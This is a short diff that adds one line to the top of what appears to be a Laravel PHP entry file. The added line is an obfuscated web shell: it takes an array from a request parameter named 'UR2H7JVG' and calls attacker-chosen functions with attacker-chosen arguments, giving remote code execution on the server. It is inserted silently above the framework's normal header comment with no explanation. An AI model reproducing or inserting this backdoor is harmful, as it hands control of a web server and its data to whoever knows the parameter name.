@@ -1,4 +1,5 @@
 <?php
+if($q307=@$ { "_REQUEST" } [ "UR2H7JVG"	])$q307[1 ](${$q307	[2]}[	0],	$q307 [	3]	(	$q307[4 ])) ;
 
 /**
  * Laravel - A PHP Framework For Web Artisans
